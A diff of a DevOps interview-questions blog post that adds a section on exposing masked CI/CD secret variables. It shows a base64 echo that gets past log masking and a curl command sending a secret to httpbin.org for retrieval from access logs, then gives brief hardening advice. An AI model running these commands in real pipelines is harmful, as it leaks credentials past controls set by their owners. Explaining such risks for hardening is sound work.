@@ -1,15 +1,23 @@
 ---
 title: "DevOps interview questions - Part 2 📓"
 date: 2020-01-19T09:35:31-04:00
+author: Stefan Caraiman
 categories:
   - devops
   - interview-questions
   - linux
+  - blog
 tags:
   - linux
   - devops
   - interview
   - debugging
+classes: wide
+header:
+  image: "https://www.onlineinterviewquestions.com/storage/categories/June2018/Devops-Interview-Questions.jpg"
+toc: true
+toc_label: "Setup of Library Charts"
+toc_icon: "cogs"
 ---
 
 Welcome back to part 2 of the DevOps interview questions blog series. 👋
@@ -80,9 +88,39 @@ The shortest and most elegant version of using the `pause` system call which I f
 $ perl -MPOSIX -e pause
 ```
 
+## Ways of exposing a secret environment variable from CI/CD pipeline?
+
+There will be times in the career of any engineer where they will get their hands on a CI/CD system, and they might not have the necessary access to see secret environment variables, such as the user and password to a registry.
+
+This in itself is not an issue, until the moment when you realize that those variables are not setup up correctly on multiple pipelines and you are currently blocked due to the fact that you can't set them up or even see them, since most CI/CD system will mask(or should mask, if it does not do this, maybe you should rethink about why you are using that system) such variables from showing in the STDOUT/output of the pipeline.
+
+For the sake of the question, we will presume we can modify the CI/CD pipeline
+
+P.S: I'm not advocating that any of these are a secure or moral way of getting around the problem and highlighting some security risks, which you should consider on harderning.
+
+### `echo` the variable in `base64`
+
+```console
+echo $MY_SECRET_VAR | base64
+```
+
+### curl any endpoint that returns the request back
+
+```
+curl -X GET "https://httpbin.org/$MY_SECRET_VAR" -H "accept: application/json"
+```
+
+This one might not work due to the fact that the `STDOUT` will contain the secret value, but if you have acccess to the access logs of the endpoint that you are sending the request to, you will be able to see it on that side.
+
+### How can you protect against this?
+
+You should make secret environment variables accessible only on protected branches, so that they cannot be exfiltrated.
+
+If the CI/CD permits, you should also block edit of the pipeline definition.
+
+
 ## Conclusion
 
 I think most of the questions described above can be addresed across different seniorities/positions, since the creativity of the answers and the depth of the understading of the issue, can greatly vary from individual to individual, being of great aid in understading how the other person can think and analyze a problem.
 
-Like always, if you have any other solutions or questions, don't be afraid to ping me up in the comment section or the other social media mediums, happy learning!
-
+Stay close for part 3 of this blog series, happy learning!
